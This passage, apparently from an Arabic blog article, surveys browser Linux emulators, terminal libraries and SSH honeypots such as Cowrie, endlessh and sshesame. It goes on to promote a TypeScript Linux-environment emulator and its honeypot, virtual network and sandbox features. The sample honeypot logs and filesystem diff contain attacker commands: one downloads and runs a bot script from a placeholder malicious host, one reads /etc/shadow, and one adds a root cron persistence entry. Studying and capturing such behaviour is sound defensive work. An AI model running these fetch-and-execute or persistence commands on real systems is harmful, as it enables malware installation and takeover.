|---|---|---|---|---|---|---|
| **البنية** | x86-32 JIT←Wasm | RISC-V (Wasm) | OR1K (JS) | x86 (ملكي) | Node.js←Wasm/WASI | x86/RISC-V (Wasm) |
| **نواة حقيقية** | ✅ | ✅ | ✅ | ✅ | ❌ (Node.js) | ✅ |
| **64-bit** | ❌ | ✅ (RISC-V) | ❌ | ✅ | لا ينطبق | ✅ |
| **حزمة npm** | ✅ | ❌ | ❌ | CDN/API | ✅ | ❌ (أداة CLI) |
| **استخدام Node.js** | ✅ | ❌ | ❌ | ❌ | ❌ (متصفح فقط) | عبر Wasmtime |
| **استخدام متصفح** | ✅ | ✅ | ✅ | ✅ | ✅ | ✅ |
| **RAM/نسخة** | 150-256 Mo | ~64-128 Mo | ~64 Mo | 200+ Mo | ~100 Mo | ~200-500 Mo |
| **زمن الإقلاع** | 15-40s | 10-30s | 10-30s | 15-40s | 2-5s | 10-40s |
| **مفتوح المصدر** | ✅ | ✅ | ✅ | ❌ | جزئي | ✅ |
| **الحالة** | ✅ نشط جدا | ✅ مستقر | ⚠️ مؤرشف | ✅ تجاري | ✅ نشط | ✅ نشط |

ما يقفز للعين في هذا الجدول : `v86` هو الوحيد الذي هو حزمة npm، ويعمل في المتصفح وNode معا، ومفتوح المصدر. لهذا يهيمن على محادثة "محاكيات Linux في JavaScript". كل الباقي له عيب، JSLinux دون API وjor1k مؤرشف وCheerpX يkost مالا وWebContainers متصفح فقط ومخصص لـNode وcontainer2wasm يتطلب خطوة بناء وCLI. إذا احتجت فقط "إقلاع Linux في JavaScript"، فـ`v86` هو نقطة البداية الصحيحة تقريبا دائما.

---

## الجزء 3، حزم الطرفية : xterm.js وnode-pty

تعود حزمتان باستمرار عندما يبني الناس تجارب من نوع shell. ليستا عزلا ولا محاكيات، بل سباكة UI وPTY، لكنهما متصلتان جدا حتى لأشعر بالسوء لتركهما. وأيضا، استخدمتهما كلتيهما وهما جيدتان فعلا.

### 3.1 `xterm.js`، عرض الطرفية

xterm.js محاكي طرفية للمتصفح. يعرض شاشة طرفية (تسلسلات هروب VT100/xterm) في عنصر `<canvas>`، ويدير مدخلات لوحة المفاتيح، ويعرض واجهة لتوجيه البيانات.

يستخدمه : الطرفية المدمجة في VS Code وAzure Cloud Shell وProxmox VE وAWS CloudShell، وغيرها الكثير.

```js
import { Terminal } from "@xterm/xterm";
import { FitAddon } from "@xterm/addon-fit";

const term = new Terminal({ cursorBlink: true });
const fitAddon = new FitAddon();
term.loadAddon(fitAddon);
term.open(document.getElementById("terminal"));
fitAddon.fit();

// إرسال بيانات للطرفية (تُعرَض كنص)
term.write("$ ");
term.onData(data => {
  // data هي الضغطات، أرسلها لخادمك الخلفي
  socket.send(data);
});
socket.onmessage(msg => {
  // مخرجات الخلفية، اعرضها
  term.write(msg.data);
});
```

xterm.js هو فقط طبقة العرض. لا ينفذ shell. ولا يفسّر الأوامر. إنه عنصر عرض تصله بخلفية اختيارك. يظن الكثيرون أن xterm.js "يصنع الطرفية" لكنه حقا مجرد الشاشة، وما زلت تحتاج وصله بشيء ينفذ الأوامر فعلا.

**npm** : [@xterm/xterm](https://www.npmjs.com/package/@xterm/xterm)
**GitHub** : [xtermjs/xterm.js](https://github.com/xtermjs/xterm.js)

---

### 3.2 `node-pty`، إنشاء PTY

ينشئ `node-pty` طرفية زائفة (PTY) في Node.js ويعطيك مقبض قراءة/كتابة عليها. مستخدما مع xterm.js، يسمح ببناء طرفية متصفح تتكلم مع shell حقيقي (bash وzsh وfish) يعمل على الخادم.

```js
import * as pty from "node-pty";

const shell = pty.spawn("bash", [], {
  name: "xterm-color",
  cols: 80,
  rows: 30,
  cwd: process.env.HOME,
  env: process.env,
});

shell.onData(data => {
  // إرسال لطرفية xterm.js في المتصفح عبر WebSocket
  ws.send(data);
});

ws.on("message", data => {
  // تمرير ضغطات المتصفح للـshell
  shell.write(data);
});
```

إنه المخطط القياسي لـIDE السحابية والطرفيات الويب : xterm.js (متصفح) ← WebSocket ← node-pty ← bash حقيقي. يبقى العزل معدوما. يعمل shell بكل أذونات عملية Node.js (أو المستخدم الذي يطلقها).

**مصان من** : Microsoft.
**npm** : [node-pty](https://www.npmjs.com/package/node-pty)
**GitHub** : [microsoft/node-pty](https://github.com/microsoft/node-pty)

---

## الجزء 4، honeypots الخاصة بـSSH

صُمِّمت honeypots لتُهاجَم. الهدف أن تبدو حقيقية بما يكفي ليتفاعل معها المهاجمون، مع تسجيل كل ما يفعلونه لاستخبارات التهديدات. SSH هو الهدف الرئيسي لأنه الخدمة الأكثر هجوما على الإنترنت، فإذا عرضت المنفذ 22 على IP عام، سترى محاولات مسح آلية خلال دقائق حرفيا. جرّب يوما، إنه مرعب إلى أي حد يحدث سريعا.

تُقاس جودة honeypot بشيئين : **الوفاء** (إلى أي حد يحاكي نظاما حقيقيا بإقناع) و**القياس عن بعد** (كم بيانات مفيدة يلتقط). وهذان في توتر. honeypot عالي الوفاء أصعب بناء وأخطر تشغيلا.

هذا القسم هو ما قادني أخيرا لبناء وحدة `HoneyPot` في `typescript-virtual-container`، فلدي بعض الآراء هنا.

### 4.1 Cowrie، المعيار الذهبي

Cowrie هو honeypot لـSSH وTelnet بتفاعل متوسط إلى عالٍ قائم على Python. إنه honeypot SSH الأكثر نشرا في مجتمع البحث والأمان.

البنية :
- **طبقة بروتوكول** : تنفيذ حقيقي لبروتوكول SSH (Twisted Conch)، فيحصل المهاجمون على مصافحات حقيقية وتبادل مفاتيح حقيقي ومصادقة حقيقية
- **طبقة shell** : نظام ملفات زائف (يشبه Debian 5.0) ومفسّر shell جزئي يرد على الأوامر الشائعة
- **وضع وكيل** : يمكنه التوجيه نحو نظام حقيقي خلفه (وضع تفاعل عالٍ)، مسجلا كل ما يمر
- **وضع LLM** (إضافة حديثة) : يستخدم نموذج لغة لتوليد ردود ديناميكية للأوامر التي لا يعرف معالجتها، نعم، صار لـCowrie الآن وضع ذكاء اصطناعي. نعيش عصرا مجنونا.

```python
# ما يلتقطه Cowrie
{
  "timestamp": "2024-01-15T03:22:11.847Z",
  "src_ip": "45.33.32.156",
  "username": "root",
  "password": "123456",
  "session": "abc123",
  "commands": [
    "uname -a",
    "cat /etc/passwd",
    "wget http://malicious.example/bot.sh",
    "chmod +x bot.sh",
    "./bot.sh"
  ],
  "files_downloaded": ["bot.sh"]
}
```

يحفظ Cowrie الملفات المنزلة (عبر wget/curl/SFTP/SCP) لتحليل البرمجيات الخبيثة. يتكامل مع Splunk وElasticsearch ومنصات SIEM أخرى.

**الوفاء** : متوسط-عالٍ. مقنع بما يكفي لخداع البوتات المؤتمتة (التي تمثل 99% من مهاجمي SSH، فمعظمها مجرد سكربتات غبية تجرب `root`/`password`). يمكن لبشر متطورين كشفه بالبصمة الرقمية مع ذلك، وبسرعة عادة.

**اللغة** : Python (Twisted)
**GitHub** : [cowrie/cowrie](https://github.com/cowrie/cowrie)

---

### 4.2 Kippo، سلف Cowrie

Kippo هو honeypot SSH الأصلي بتفاعل متوسط الذي بُني عليه Cowrie. نفس الفكرة الأساسية : بروتوكول SSH حقيقي ونظام ملفات زائف وshell جزئي. تجاوزه Cowrie تماما في هذه المرحلة، فـKippo مؤرشف ولا يجب على أحد استخدامه في 2026. مذكور هنا خالصا للاكتمال التاريخي، فقد تراه مُشارا إليه في مقالات مدونة قديمة وأوراق أمان.

**GitHub** : [desaster/kippo](https://github.com/desaster/kippo)، مؤرشف

---

### 4.3 endlessh، حفرة القطران الخاصة بـSSH

endlessh هو honeypot منحط : يُبقي اتصالات SSH مفتوحة ببث بيانات اللافتة ببطء بمعدل 1 بايت في الثانية (أو أقل). عميل SSH يتصل به سيبقى عالقا إلى أجل غير مسمى، فلن يصل أبدا للمصادقة لأن الخادم لا ينتهي أبدا من إرسال اللافتة.

الهدف ليس استخبارات تهديدات بل حرمان خالص من المورد : إشغال خيوط مسح المهاجمين لكي لا يستطيعوا بلوغ الأهداف الحقيقية بنفس السرعة. إنه شيطاني بعض الشيء بصراحة بالمعنى الجيد. لا تتعلم شيئا من المهاجم، فقط تضيّع وقته. هناك شيء مُرضٍ بعمق في ذلك.

```c
// كل سلوك endlessh البروتوكولي :
// إرسال : "SSH-2.0-OpenSSH_" ثم إضافة حروف عشوائية ببطء
// عدم إغلاق الاتصال أبدا
// ماسح المهاجم تنتهي مهلته بعد N ثانية
```

لا أمر يُلتَقَط. لا مصادقة تُختَبَر. فقط زمن اتصال.

**مكتوب بـ** : C
**GitHub** : [skeeto/endlessh](https://github.com/skeeto/endlessh)

---

### 4.4 sshesame، honeypot "يدخل الجميع"

يقبل sshesame كل اتصالات SSH (أي مستخدم وأي كلمة سر وأي مفتاح) ويسجل كل شيء. إنه honeypot بصفر تفاعل : لا يرد على الأوامر، بل يترك المهاجمين "يدخلون" فقط ويسجل كل ضغطة يكتبونها.

```
2024-01-15 03:22:11 اتصال من 45.33.32.156
  المستخدم : root وكلمة السر : password123، مقبول
  الأوامر المكتوبة :
    cat /etc/shadow
    wget http://malicious.example/miner
    uname -a
  انقطع بعد 47s
```

مفيد لحصاد بيانات الاعتماد : تتراكم سريعا أسماء المستخدمين وكلمات السر التي تجربها البوتات، مما يخبرك أي بيانات افتراضية تُجبَر بنشاط حاليا. تشويق : إنها دائما `root`/`password` و`admin`/`admin` و`root`/`123456`. في كل مرة.

**GitHub** : [jaksi/sshesame](https://github.com/jaksi/sshesame)

---

### 4.5 Lyrebird، إطار honeypot قائم على Docker

`lyrebird/honeypot-base` صورة Docker أساسية لبناء honeypots لخدمات الشبكة. ليست honeypot SSH تحديدا، بل إطار لبناء honeypots لأي بروتوكول.

توفر الصورة الأساسية إطار تسجيل ونظام إضافات للبروتوكولات وإعدادات Docker Compose لـhoneypots متعددة الخدمات. توسّعها لمحاكاة خدمات بعينها.

**Docker Hub** : [lyrebird/honeypot-base](https://hub.docker.com/r/lyrebird/honeypot-base/)

---

### 4.6 بناء honeypot SSH في Node.js، الطريقة الساذجة، ولماذا تفشل

قبل `typescript-virtual-container`، كان بناء honeypot SSH في Node.js يعني دمج مكتبة `ssh2` الحقيقية مع محاكاة يدوية للأوامر. ممل جدا وناقص جدا، لكن... إنه طقس عبور في هذه المرحلة :

```js
import { Server } from "ssh2";
import { readFileSync } from "fs";
import { appendFileSync } from "fs";

const hostKey = readFileSync("./host.key");

new Server({ hostKeys: [hostKey] }, client => {
  client.on("authentication", ctx => {
    // تسجيل المحاولة
    appendFileSync("creds.log", `${ctx.username}:${ctx.credentials?.password}\n`);
    ctx.accept(); // دخول الجميع
  });

  client.on("ready", () => {
    client.on("session", (accept) => {
      const session = accept();
      session.on("shell", accept => {
        const stream = accept();
        stream.write("Last login: Mon Jan 15 03:00:00 2024 from 10.0.0.1\r\n");
        stream.write("root@ubuntu:~# ");
        stream.on("data", data => {
          const cmd = data.toString().trim();
          appendFileSync("commands.log", `${cmd}\n`);
          // رد محاكًى
          if (cmd === "uname -a") {
            stream.write("\r\nLinux ubuntu 5.15.0-91-generic #101-Ubuntu x86_64 GNU/Linux\r\n");
          } else {
            stream.write(`\r\n${cmd}: command not found\r\n`);
          }
          stream.write("root@ubuntu:~# ");
        });
      });
    });
  });
}).listen(2222);
```

"يعمل" بمعنى أنه يلتقط بيانات الاعتماد والأوامر. لكنه زائف بوضوح بمجرد أن يحفر مهاجم متطور قليلا. يعيد `uname -a` السلسلة الصحيحة لكن `ls /etc` يعيد "command not found"، فتفوح منه رائحة الفخ. نظام الملفات غير موجود. الأوامر لا تتسلسل. الأنابيب لا تعمل. المتغيرات لا تتوسع.

سيكشف مهاجم كفء honeypot خاصتك في أول خمسة أوامر. وستكشفه فورا أيضا السكربتات المؤتمتة التي تبحث عن سلوك من نوع Cowrie. وهذا على ما يبدو ما دفع كاتبة `typescript-virtual-container` لبناء شيء يفسّر الأوامر فعلا للحقيقة، المزيد عن ذلك في الجزء 5.

---

### ملخص عائلة honeypots

| | Cowrie | Kippo | endlessh | sshesame | Lyrebird | Naïf ssh2 |
|---|---|---|---|---|---|---|
| **مستوى التفاعل** | متوسط-عالٍ | متوسط | صفر | صفر | متغير | ضعيف |
| **بروتوكول SSH حقيقي** | ✅ | ✅ | ❌ (حفرة) | ✅ | متغير | ✅ |
| **وفاء shell** | متوسط | متوسط | لا ينطبق | لا شيء | متغير | دنيا |
| **يلتقط بيانات الاعتماد** | ✅ | ✅ | ❌ | ✅ | ✅ | ✅ |
| **يلتقط الأوامر** | ✅ | ✅ | ❌ | ✅ | متغير | ✅ |
| **يلتقط البرمجيات الخبيثة** | ✅ | ✅ | ❌ | ❌ | ❌ | ❌ |
| **تكامل SIEM** | ✅ أصلي | ❌ | ❌ | ❌ | ❌ | يدوي |
| **ردود LLM** | ✅ (جديد) | ❌ | ❌ | ❌ | ❌ | ❌ |
| **اللغة** | Python | Python | C | Go | Docker | Node.js |
| **Node.js أصلي** | ❌ | ❌ | ❌ | ❌ | ❌ | ✅ |
| **الحالة** | ✅ نشط جدا | ⚠️ مؤرشف | ✅ نشط | ✅ نشط | ✅ نشط | اصنعها بنفسك |

النمط هنا واضح إلى حد ما : كلما أردت وفاء أكثر، كتبت Python أكثر. Cowrie هو الفائز بلا منازع إذا فعلت ذلك جديا، فقد اختُبر ميدانيا لسنوات ويلتقط أكثر بكثير من مجرد بيانات اعتماد. endlessh وsshesame مشروعان لطيفان أكثر من أدوات جدية لاستخبارات التهديدات. والمقاربة الساذجة في Node.js قد توصلك لـ20% من الطريق قبل أن تصطدم بجدار.

---

## الجزء 5، `typescript-virtual-container` : ما يسد الفجوة

حسنا هنا تصبح الأمور مثيرة. بعد فهرسة كل العائلات أعلاه، يصبح الربع الناقص واضحا إلى حد ما :

- عزل JS : تعزل الكود، لا shell ولا نظام ملفات ولا SSH
- محاكيات Linux : نظام حقيقي وshell حقيقي وSSH حقيقي... لكن 150+ Mo ذاكرة و30 ثانية إقلاع، ويجب أن تبني واجهتك فوق إدخال/إخراج التسلسل
- honeypots : shell زائف، ولا API قابلة للبرمجة، وPython/Go/C، وليست Node أصليا

لم يبنِ أحد بيئة Linux كاملة قابلة للبرمجة أصلية في Node، مع SSH حقيقي وأذونات حقيقية وشبكة افتراضية حقيقية وواجهة TypeScript مُنمَّطة. فبنتها هي.

مقدمة صغيرة بما أنها أول مرة أذكرها صحيحا : بُني `typescript-virtual-container` من [Chloé Rolzhausen](https://itsrealfortune.fr)، مطورة فرنسية تسمي نفسها **Fortune** (أو ItsRealFortune) على الإنترنت. تجدها على [موقعها](https://itsrealfortune.fr) وعلى [LinkedIn](https://www.linkedin.com/in/chlo%C3%A9-rolzhausen-1b0439316/). المشروع كله، 56 000 سطر TypeScript و247 ملفا و170 أمرا، كان جهدا فرديا من شخص واحد. سأناديها Fortune لبقية المقال. ونعم، هذا جنوني إلى حد ما. ألقِ نظرة على عملها !

### ما هو فعلا

`typescript-virtual-container` **محاكي بيئة Linux** مكتوب TypeScript خالص. دون Wasm ودون امتدادات أصلية ودون نواة. ~56 000 سطر مصدر موزعة على 247 ملف TypeScript.

البصيرة الأساسية : لا تحتاج محاكي CPU لتشغيل `ls /etc | grep passwd`. تحتاج :
1. شجرة عقد في الذاكرة تستجيب لعمليات المسار
2. نموذج أذونات POSIX مطبق على كل وصول
3. محلل shell نحوي يفهم الأنابيب وإعادة التوجيه والـsubshells وتوسيع المتغيرات
4. ~170 تنفيذ أوامر (دوال، لا ثنائيات)
5. نظام إدارة مستخدمين ومجموعات
6. شيئا لعرض كل ذلك عبر SSH

كل ذلك قابل للتحقيق في TypeScript خالص دون أي إشراك للنواة.

### نظام الملفات الافتراضي

VFS شجرة ذاكرة من عقد مُنمَّطة، لا إدخال/إخراج قرص إلا إذا فعّلت صراحة وضع الثبات `"fs"` :

```ts
// تمثيل داخلي مبسط
type InternalNode =
  | { type: "file"; content: string | Uint8Array; mode: number; uid: number; gid: number; mtime: number }
  | { type: "dir"; children: Map<string, InternalNode>; mode: number; uid: number; gid: number }
  | { type: "symlink"; target: string }
  | { type: "device"; kind: "char" | "block"; read(): string; write(data: string): void }
  | { type: "stub" }; // عنصر نائب يُحمَّل بكسل
```

تمر كل عملية مسار عبر `normalizePath` (يحل `.` و`..` والروابط الرمزية) و`enforceAccess` (يتحقق من أذونات قراءة/كتابة/تنفيذ مقابل uid/gid الطالب). `chmod` و`chown` والـsticky bits وsetuid كلها منفذة ومطبقة فعلا. إذا حاولت عملية تعمل كـuid 1000 قراءة ملف يملكه root بالوضع 0600، تحصل على EACCES، ليس EACCES زائفا، `Error` حقيقية في JavaScript تُرمى من فحص الإذن. هذا الجزء أنيق فعلا بصراحة.

يتسلسل VFS إلى :
- `.vfsb`، صيغة ثنائية مدمجة (مخصصة، مع ضغط fflate)، وهي الصيغة الافتراضية
- لقطة JSON، مقروءة بشريا، جيدة للتصحيح
- أرشيف TAR، استيراد/تصدير مع صيغة tar الحقيقية، فتستطيع `tar -xf` شيئا فيملك VFS هذه الملفات فقط... هذه الملفات
- صورة SquashFS، استيراد للقراءة فقط

في وضع الثبات `"fs"`، يحافظ على سجل كتابة مسبقة (WAL) للاستعادة بعد الانهيار، تذهب الكتابات أولا للسجل، ثم للقطة عند التفريغ. إذا انهار Node وسط عملية، يسمح لك السجل بإعادة بناء آخر حالة كاملة.

وهناك أيضا طبقة `FileCache` تحاكي زمن إدخال/إخراج القرص. تضبط ملفات مثل `NVME_DISK_IO` أو `HDD_DISK_IO` فيؤخر VFS اصطناعيا عمليات الملفات لمطابقة توقيتات واقعية. وهذا مضحك إلى حد ما، برنامج يبطئ نفسه عمدا لمحاكاة عتاد، لكنه مفيد فعلا للقياس.

### مفسّر shell

ينتج المحلل النحوي لـshell شجرة AST مُنمَّطة :

```ts
// "ls /etc | grep root && echo done" تُحلَّل إلى :
{
  type: "statement",
  pipeline: [
    { name: "ls", args: ["/etc"], redirects: [] },
    { name: "grep", args: ["root"], redirects: [] }
  ],
  next: {
    op: "&&",
    statement: {
      type: "statement",
      pipeline: [{ name: "echo", args: ["done"], redirects: [] }],
      next: null
    }
  }
}
```

يجوب المنفذ هذه الشجرة :
- لخط أنابيب، ينشئ سلسلة تدفقات `{ stdin وstdout وstderr }` وينفذ كل أمر مع إدخال/إخراج منقول
- للمعاملات المنطقية (`&&` و`||`)، يتحقق من `$?` بعد الجانب الأيسر قبل تنفيذ الأيمن
- للـsubshells (`$(...)` و`` ` ` ``)، يشعّب سياق التنفيذ
- لإعادة التوجيه (`>ملف` و`>>ملف` و`2>&1` و`<ملف`)، يضبط توصيل التدفقات قبل التنفيذ
- لمهام الخلفية (`cmd &`)، ينفذ دون انتظار النهاية
- للمتغيرات، يوسّع `$VAR` و`${VAR:-default}` و`${#VAR}` والحساب `$((expr))`
- لتوسيع الأقواس (`{a,b,c}` و`{1..5}`)، يولّد قائمة التوسيع الكاملة قبل التنفيذ

كل ذلك سلوك shell حقيقي في POSIX. يعالج المحلل heredocs واستبدال العمليات والتجميع (`*` و`?` و`[abc]`) وإدارة علامات الاقتباس (مفردة ومزدوجة مع استيفاء وهروب بشرطة خلفية). ليس مثاليا، توجد حالات حدية، لكنه أبعد بكثير مما تتوقعه من مشروع TypeScript.

### ~170 أمرا مدمجا

الأوامر دوال TypeScript مسجلة في سجل أوامر. تستلم `CommandContext` مع تدفقات stdin/stdout/stderr وVFS وجلسة المستخدم وبيئة shell والوصول للوحدات الفرعية.

كتابة 170 تنفيذ لأوامر Unix... كثير. بعضها تافه (`echo` و`true` و`false`)، وبعضها معقد بشكل مدهش (`awk` و`find` و`tar`). يعني، `awk` كامل في POSIX ؟ في TypeScript ؟ هذا جنوني بصراحة. إليكم عينة مما فيها :

```
cat, ls, cp, mv, rm, mkdir, rmdir, touch, chmod, chown, chgrp,
ln, readlink, find, locate, stat, file,
echo, printf, read, test, [, [[,
grep, sed, awk, cut, sort, uniq, wc, head, tail, tr,
ps, top, kill, pkill, nice, ionice,
ssh, scp, sftp (جهة عميل، اتصال صادر),
ping, curl, wget, nc, netstat, ss, ip, ifconfig, route,
apt, apt-get, apt-cache, dpkg, pacman,
useradd, usermod, userdel, groupadd, passwd, su, sudo,
tar, gzip, gunzip, bzip2, bunzip2, xz, unxz, zip, unzip,
git (stub), python3 (stub), node (stub),
nano (محرر تفاعلي كامل), vim (أساسي), vi (أساسي),
neofetch, htop, tree, df, du, free, uptime, who, w, last,
cron (محاكًى), systemctl (stub), journalctl (stub),
...وحوالي 130 أخرى
```

"stubs" (git وpython3 وnode) ترد واقعيا على الاستدعاءات الشائعة، يعيد `python3 --version` سلسلة إصدار موثوقة، ويعرض `git status` حالة مستودع وهمية، دون عمل حقيقي. لـhoneypot، هي في الواقع أنفع من الأوامر الحقيقية، لأنها تسمح لك بمراقبة ما يحاول المهاجمون تنفيذه دون تنفيذ شيء خطير.

### خادم SSH

تستخدم طبقة SSH حزمة npm الحقيقية `ssh2`، بروتوكول SSH حقيقي وتبادل مفاتيح حقيقي وتشفير حقيقي. يغلّفها `SSHMimic` :

```ts
import { VirtualSshServer } from "typescript-virtual-container";

const ssh = new VirtualSshServer({
  port: 2222,
  hostname: "prod-server-01",
  shellProperties: {
    kernel: "5.15.0-91-generic #101-Ubuntu SMP",
    os: "Ubuntu 22.04.3 LTS",
    arch: "x86_64",
  },
});
await ssh.start();
// SSH حقيقي : ssh -p 2222 root@localhost
// SFTP حقيقي : sftp -P 2222 root@localhost
// SCP حقيقي : scp -P 2222 file root@localhost:/tmp/
```

تحدد `shellProperties` ما تعيده أوامر `uname -a` و`lsb_release -a` و`neofetch` و`/proc/version` و`/etc/os-release`. تستطيع انتحال أي توزيعة Linux وإصدار نواة بإقناع، فبالنسبة لعميل SSH حقيقي، لا توجد حرفيا طريقة للتمييز.

### وحدة HoneyPot

ولأن مفسّر shell حقيقي وخادم SSH حقيقي، تُنفَّذ أوامر المهاجمين فعلا في البيئة الافتراضية. تُسجَّل طلبات `wget` التي يحفّزها المهاجم مع روابط الوجهة. تُحفَظ الملفات التي ينشئها المهاجم في VFS. وتنتج محاولات تصعيد امتيازات المهاجم أخطاء واقعية.

```ts
import { VirtualSshServer, HoneyPot, diffSnapshots } from "typescript-virtual-container";

const pot = new HoneyPot({
  onCommand: (session, cmd) => threatIntel.record({ cmd, ip: session.remoteAddress }),
  onDownload: (session, url) => malwareAnalysis.queue(url),
  onAuthentication: (username, password, accepted) => credHarvest.log({ username, password }),
});

const ssh = new VirtualSshServer({ port: 22, honeypot: pot });
await ssh.start();

// بعد جلسة، ميّز نظام الملفات
const before = shell.vfs.toSnapshot();
// ... جلسة المهاجم ...
const after = shell.vfs.toSnapshot();
const diff = diffSnapshots(before, after);
/*
  diff = [
    { op: "create", path: "/tmp/.hidden/bot.sh", content: "#!/bin/bash\ncurl..." },
    { op: "chmod", path: "/tmp/.hidden/bot.sh", from: 0o644, to: 0o755 },
    { op: "create", path: "/var/spool/cron/root", content: "* * * * * /tmp/.hidden/bot.sh" }
  ]
*/
```

هذا مختلف نوعيا عن Cowrie. يستطيع نظام ملفات Cowrie الزائف الرد على `ls` لكنه لا يستطيع تتبع فعلا الملفات التي أنشأها مهاجم والتعديلات التي أجراها كفرق منظم. يستطيع `typescript-virtual-container` ذلك، لأن VFS بنية بيانات حية، كل كتابة مُتتبَّعة. مدخل cron الذي أضافه المهاجم للتو ؟ إنه في الفرق. مجلد `.hidden` هذا ؟ في الفرق. مفيد إلى حد ما لتحليل البرمجيات الخبيثة.

### حزمة الشبكة الافتراضية

وهذه على الأرجح أكثر أجزاء المشروع كله إثارة للإعجاب، وليس لها مثيل في أي مشروع آخر في هذا الفضاء. يعني، حزمة شبكة افتراضية كاملة L2/L3 مع دعم VPN، مكتوبة TypeScript خالص، دون أي بطاقة شبكة حقيقية مشمولة. هذا جنوني فعلا.

يمنح `VirtualNetworkManager` كل نسخة `VirtualShell` واجهات شبكة افتراضية بعناوين IP قابلة للضبط وجداول توجيه وجدار ناري برمجي (قواعد بنمط iptables مع conntrack وNAT). تعرض أوامر `ip addr` و`ip route` و`iptables -L` و`netstat -rn` كلها حالة الشبكة الافتراضية.

يربط `VirtualSwitch` (المسمى Baie، من الكلمة الفرنسية لرف الخادم، "baie informatique") عدة shells على شبكة فرعية مشتركة. ينفذ :
- تعلم MAC وARP
- توجيه IP بين الشبكات الفرعية
- NAT (تنكر صادر)
- DNS (سجلات قابلة للضبط لكل شبكة فرعية)
- موازنة حمل (round-robin وأقل اتصالات)
- تشكيل ترافيك : زمن وارتعاش (توزيع غاوسي) وفقد حزم وفقد دفعي وإعادة ترتيب وتكرار
- تحديد عرض نطاق (دلو رموز)
- تطبيق MTU
- تتبع اتصال (مع حالة، وحالات NEW/ESTABLISHED/TIME_WAIT)

```ts
const baie = new Baie("192.168.0.0/24");

// ثلاث آلات افتراضية على نفس المبدل
const web = new VirtualShell("web");
const api = new VirtualShell("api");
const db  = new VirtualShell("db");

baie.attach(web, "192.168.0.2");
baie.attach(api, "192.168.0.3");
baie.attach(db,  "192.168.0.4");

// جدار ناري : web تستطيع بلوغ api وapi تستطيع بلوغ db وweb لا تستطيع بلوغ db مباشرة
baie.addFirewallRule({ src: "192.168.0.2", dst: "192.168.0.4", proto: "tcp", action: "DROP" });

// تشكيل ترافيك : محاكاة وصلة WAN غير مستقرة نحو الخارج
baie.setInterface("192.168.0.2", { latencyMs: 50, jitterMs: 10, packetLoss: 0.001 });
```

ينشئ `VirtualVpn` أنفاقا مشفرة بين نسخ Baie، فتستطيع محاكاة شبكة متعددة المواقع مع ترابط VPN بين المواقع.

ينفذ `VirtualProxy` تمرير المنافذ ووكيل SOCKS5.

لا شيء من ذلك يلمس بطاقة شبكة حقيقية. إنه كله توجيه كائنات TypeScript. يعمل أمر `ping` بالتوجيه عبر المبدل الافتراضي وإعادة ردود ICMP محاكاة. يوجه `curl http://192.168.0.3/api` عبر الشبكة الافتراضية، ويبلغ رد HTTP المحاكى للـshell المسماة api، ويعيد المحتوى. إنها سلاحف حتى الأسفل، بأفضل معنى ممكن.

### `SandboxedShell`

للاستخدام البرمجي حيث تحتاج عزلا أقوى، ينفذ `SandboxedShell` جلسة shell في خيط Worker خاص بـNode.js :

```ts
import { SandboxedShell } from "typescript-virtual-container";

const shell = new SandboxedShell({
  memoryMB: 128,
  cpuQuota: 0.25, // 25% من نواة
  timeoutMs: 5000,
});

const result = await shell.exec("ls /etc | grep -c .");
console.log(result.stdout); // "42\n"
console.log(result.exitCode); // 0
```

العزل هنا مؤمَّن بطبقة VFS (لا يستطيع shell خيط worker رؤية إلا نظام الملفات الافتراضي، أبدا نظام ملفات المضيف) مع عزل ذاكرة خيط Worker في Node.js. إنه أخف من `isolated-vm` لكن أنسب لعزل في مستوى shell بدلا من مستوى JS.

### تحديد الموارد

تستطيع ضبط حدود موارد لكل shell تؤثر فيما تعيده أوامر مراقبة النظام :

```ts
const shell = new VirtualShell("limited-vm", {}, {}, {
  maxRamMB: 512,
  maxCpuCores: 2,
});
```

داخل هذا shell، يعرض `free -m` إجمالي 512 Mo ذاكرة. ويعيد `nproc` الرقم 2. ويعرض `/proc/meminfo` القيم المحددة. وتعرض `htop` و`top` عدد CPU المحدد. وهذا يسمح لك بتعريف بدقة البصمة العتادية للآلة المحاكاة.

### ثلاثة أوضاع نشر

```
الوضع 1 : خادم SSH/SFTP
  VirtualSshServer / VirtualSftpServer
  ← بروتوكول SSH حقيقي وSFTP حقيقي وSCP حقيقي
  ← حالة استخدام : honeypots وبيئات اختبار بعيدة ومختبرات تدريب

الوضع 2 : Shell ويب (متصفح)
  builds/fortune-nyx-v1.7.8-web.min.js (حزمة ESM)
  ← يعمل في المتصفح وVFS مثبَّت في IndexedDB
  ← حالة استخدام : دروس تفاعلية وطرفيات مضمنة وعروض
  ← ميزة : نفّذ startxfce4 لمكتب XFCE كامل محاكًى

الوضع 3 : CLI مستقل
  builds/fortune-nyx-v1.7.8-directbash-k6.1.0.mjs (ملف واحد، دون تثبيت)
  ← نفّذ عبر curl وثبّت VFS في مجلد .vfs/
  ← حالة استخدام : عروض سريعة وتجريب محلي
```

### polyfills، كيف يعمل بناء المتصفح دون Wasm

حسنا هذه هي الجزء الذي أجده ذكيا فعلا وأردت إبرازه خصوصا.

تشغيل مكتبة Node.js في المتصفح كابوس عادة. إما تستخدم runtime في Wasm (ثقيل وبطيء التحميل)، أو تقضي أسابيع تستبدل يدويا كل استيراد `node:*` ببديل متوافق متصفح. فعلت Fortune الشيء الثاني، لكن بنظافة شديدة، بكتابة مجموعة polyfills مخصصة تعيش في مجلد `polyfills/` في المستودع.

خط بناء هو فقط esbuild مع كومة مداخل `alias` :

```js
// demo/build.js، كل إعداد بناء المتصفح
esbuild.build({
  entryPoints: ['app.ts'],
  bundle: true,
  platform: 'browser',
  alias: {
    'node:events':         '../polyfills/node_events/index.js',
    'node:path':           '../polyfills/node_path/index.js',
    'node:os':             '../polyfills/node_os/index.js',
    'node:fs':             '../polyfills/node_fs/index.js',
    'node:fs/promises':    '../polyfills/node_fs/promises.js',
    'node:crypto':         '../polyfills/node_crypto/index.js',
    'node:child_process':  '../polyfills/node_child_process/index.js',
    'node:zlib':           '../polyfills/node_zlib/index.js',
    'node:vm':             '../polyfills/node_vm/index.js',
    'node:net':            '../polyfills/node_net/index.js',
    'node:url':            '../polyfills/node_url/index.js',
    'node:worker_threads': '../polyfills/node_worker_threads/index.js',
    'ssh2':                '../polyfills/ssh2/index.js',
    'roxify':              '../polyfills/roxify.js',
  },
  inject: ['../polyfills/process.js', '../polyfills/buffer.js'],
  minify: true,
  treeShaking: true,
});
```

